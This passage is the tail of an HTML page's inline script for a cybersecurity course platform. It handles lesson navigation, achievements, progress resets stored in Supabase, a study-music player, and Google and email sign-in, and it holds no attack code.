        if (currentLessonIndex > 0) {
          trackLessonTime(); // Track time spent on current lesson
          currentLessonIndex--;
          loadLesson(currentLessonIndex);
        }
      }

      function goToNextLesson() {
        if (currentLessonIndex < COURSE_DATA.lessons.length - 1) {
          const canGoNext = canAccessLesson(currentLessonIndex + 1);
          if (canGoNext) {
            trackLessonTime();
            currentLessonIndex++;
            loadLesson(currentLessonIndex);
          } else {
            showToast("Complete the current lesson quiz to proceed", "warning");
          }
        } else {
          // Complete course
          completeCourse();
        }
      }

      // =====================================================
      // SIDEBAR FUNCTIONS
      // =====================================================
      function toggleSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.toggle("open");
        if (overlay) overlay.classList.toggle("active");
      }

      function closeSidebar() {
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar) sidebar.classList.remove("open");
        if (overlay) overlay.classList.remove("active");
      }

      // =====================================================
      // ACHIEVEMENT NOTIFICATION SYSTEM
      // =====================================================
      function queueAchievementNotification(achievement) {
        notificationQueue.push(achievement);
        processNotificationQueue();
      }

      function processNotificationQueue() {
        if (isShowingNotification || notificationQueue.length === 0) return;

        isShowingNotification = true;
        const achievement = notificationQueue.shift();
        showAchievementNotification(achievement);

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          isShowingNotification = false;
          processNotificationQueue();
        }, duration + 500);
      }

      function showAchievementNotification(achievement) {
        const notification = document.getElementById("achievementNotification");
        if (!notification) return;

        const icon = document.getElementById("notificationIcon");
        const title = document.getElementById("notificationTitle");
        const description = document.getElementById("notificationDescription");
        const points = document.getElementById("notificationPoints");

        if (icon) {
          icon.innerHTML = `<i class="${achievement.icon}"></i>`;
          icon.className = `notification-icon ${achievement.rarity}`;
        }
        if (title) title.textContent = achievement.name;
        if (description) description.textContent = achievement.description;
        if (points) points.textContent = `+${achievement.points} Points`;

        notification.className = `achievement-notification ${achievement.rarity}`;
        notification.classList.add("show");

        const duration =
          achievement.rarity === "mythic"
            ? 8000
            : achievement.rarity === "legendary"
            ? 7000
            : 6000;

        setTimeout(() => {
          notification.classList.remove("show");
        }, duration);
      }

      // =====================================================
      // UTILITY FUNCTIONS
      // =====================================================
      function calculateAverageQuizScore() {
        const scores = Object.values(courseProgress)
          .filter((p) => p.completed && p.quizScore)
          .map((p) => p.quizScore);

        if (scores.length === 0) return 0;
        return Math.round(
          scores.reduce((sum, score) => sum + score, 0) / scores.length
        );
      }

      async function resetProgress() {
        if (
          !confirm(
            "Are you sure you want to reset your progress? This action cannot be undone."
          )
        ) {
          return;
        }

        try {
          // Track lesson time before reset
          trackLessonTime();

          // Reset local state
          courseProgress = {};
          currentLessonIndex = 0;
          courseSession = {
            startTime: new Date(),
            totalStudyTime: 0,
            lessonsStarted: 0,
            lessonsCompleted: 0,
            pageLoadTime: new Date(),
            interactionCount: 0,
            lastActivityTime: new Date(),
          };

          // Delete from database
          await supabase
            .from("course_progress")
            .delete()
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id);

          // Log reset activity
          logUserActivity("progress_reset", {
            course_id: COURSE_DATA.id,
            reset_reason: "manual",
          });

          // Reinitialize
          await saveProgress();
          renderSidebar();
          loadLesson(0);

          showToast("Progress reset successfully", "success");
        } catch (error) {
          console.error("Error resetting progress:", error);
          showToast("Failed to reset progress", "error");
        }
      }

      function copyCode(codeId) {
        const codeElement = document.getElementById(codeId);
        if (!codeElement) return;

        const text = codeElement.textContent;

        navigator.clipboard
          .writeText(text)
          .then(() => {
            showToast("Code copied to clipboard!", "success");

            // Track code copy for achievements
            logUserActivity("code_copied", {
              code_section: codeId,
              lesson_id: COURSE_DATA.lessons[currentLessonIndex].id,
            });
          })
          .catch((err) => {
            console.error("Failed to copy code:", err);
            showToast("Failed to copy code", "error");

            // Fallback for older browsers
            const textArea = document.createElement("textarea");
            textArea.value = text;
            document.body.appendChild(textArea);
            textArea.select();
            try {
              document.execCommand("copy");
              showToast("Code copied to clipboard!", "success");
            } catch (fallbackError) {
              showToast(
                "Copy failed - please select and copy manually",
                "error"
              );
            }
            document.body.removeChild(textArea);
          });
      }

      function escapeHtml(text) {
        const div = document.createElement("div");
        div.textContent = text;
        return div.innerHTML;
      }

      // =====================================================
      // UI FEEDBACK SYSTEMS
      // =====================================================
      function showToast(message, type = "success") {
        const toast = document.getElementById("toast");
        const messageEl = document.getElementById("toastMessage");

        if (!toast || !messageEl) {
          console.log(`Toast: ${message} (${type})`);
          return;
        }

        messageEl.textContent = message;
        toast.className = `toast ${type} show`;

        setTimeout(() => {
          toast.classList.remove("show");
        }, 4000);
      }

      function showLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) loadingScreen.classList.remove("hidden");
      }

      function hideLoadingScreen() {
        const loadingScreen = document.getElementById("loadingScreen");
        if (loadingScreen) {
          setTimeout(() => {
            loadingScreen.classList.add("hidden");
          }, 1000);
        }
      }

      // =====================================================
      // MUSIC PLAYER INTEGRATION
      // =====================================================
      function initMusicPlayer() {
        const btnText = document.getElementById("music-button-text");
        const icon = document.getElementById("music-icon");
        const dropdown = document.getElementById("music-dropdown-content");

        if (!btnText || !icon || !dropdown) return;

        function setUI(state) {
          btnText.textContent =
            state === "Playing" ? "PAUSE MUSIC" : "STUDY MUSIC";
          icon.className =
            state === "Playing"
              ? "fa-solid fa-circle-pause"
              : "fa-solid fa-music";
        }

        // Load saved music state
        const savedSrc = localStorage.getItem("cybersec_music_src");
        const savedTime = parseFloat(
          localStorage.getItem("cybersec_music_time") || 0
        );

        if (savedSrc) {
          audioPlayer.src = savedSrc;
          audioPlayer.currentTime = savedTime;
          audioPlayer
            .play()
            .then(() => setUI("Playing"))
            .catch(() => setUI("Stopped"));
        }

        // Music button click handler
        document
          .getElementById("music-dropdown")
          .querySelector("button")
          .addEventListener("click", (e) => {
            e.stopPropagation();
            dropdown.style.display =
              dropdown.style.display === "block" ? "none" : "block";

            if (audioPlayer.src && !audioPlayer.paused) {
              audioPlayer.pause();
              setUI("Stopped");
            } else if (audioPlayer.src) {
              audioPlayer.play().then(() => setUI("Playing"));
            }
          });

        // Music selection handlers
        dropdown.querySelectorAll("a[data-src]").forEach((link) => {
          link.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.src = link.dataset.src;
            audioPlayer.play().then(() => setUI("Playing"));
            localStorage.setItem("cybersec_music_src", link.dataset.src);
            dropdown.style.display = "none";
          });
        });

        // Stop music handler
        const stopLink = document.getElementById("stop-music-link");
        if (stopLink) {
          stopLink.addEventListener("click", (e) => {
            e.preventDefault();
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            audioPlayer.removeAttribute("src");
            setUI("Stopped");
            localStorage.removeItem("cybersec_music_src");
            localStorage.removeItem("cybersec_music_time");
            dropdown.style.display = "none";
          });
        }

        // Save music state before page unload
        window.addEventListener("beforeunload", () => {
          if (!audioPlayer.paused && audioPlayer.src) {
            localStorage.setItem("cybersec_music_src", audioPlayer.src);
            localStorage.setItem(
              "cybersec_music_time",
              audioPlayer.currentTime
            );
          }
        });

        // Close dropdown when clicking outside
        window.addEventListener("click", (e) => {
          if (!e.target.closest("#music-dropdown")) {
            dropdown.style.display = "none";
          }
        });
      }

      // Show initial music indicator
      function addMusicIndicator() {
        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo:
                window.location.origin +
                "/courses/network-penetration-testing",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

